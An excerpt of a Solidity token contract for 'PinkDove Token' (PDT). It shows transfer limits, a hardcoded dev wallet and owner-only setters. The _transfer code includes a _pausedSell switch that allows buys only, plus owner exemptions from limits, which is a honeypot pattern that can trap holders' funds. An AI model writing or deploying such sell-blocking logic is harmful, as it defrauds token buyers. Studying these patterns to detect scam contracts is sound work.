...
contract PinkDoveProject is Context, IERC20, Ownable {
    ...
    string private _name = "PinkDove Token";
    string private _symbol = "PDT";
    uint8 private _decimals = 9;

    bool public isCheckLimit = false;
    ...
    uint256 public _balanceLimitRate = 2;
    
    uint256 public _maxTxAmount = 1000000 * 10**6 * 10**9;
    uint256 private minimumTokensBeforeSwap = 1000 * 10**6 * 10**9;
    
    address payable public devAddress = 0xE2ae89fb049Fb8FAcCccBB6535adF1BDeda15199; 
    ...
    function _transfer(
        ...
        if(_pausedSell){
          require(from == uniswapV2Pair, "BEP20: Buy is only available");
        }
        
        if(from != owner() && to != owner())
        {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            if(to != uniswapV2Pair && _isExcludedFromLimit[to] != true){
                uint256 _tokenBalance = balanceOf(to);
                uint256 limitBalance = _tTotal.mul(_balanceLimitRate).div(10**2);

                require(_tokenBalance.add(amount) <= limitBalance, "limited maximum token balance");
            }
        }
    ...
    function setBalanceLimitRate(uint256 limitRate) public onlyOwner {
        _balanceLimitRate = limitRate;
    }
    ...
    function setCheckLimit(bool _enabled) public onlyOwner {
        isCheckLimit = _enabled;
    }
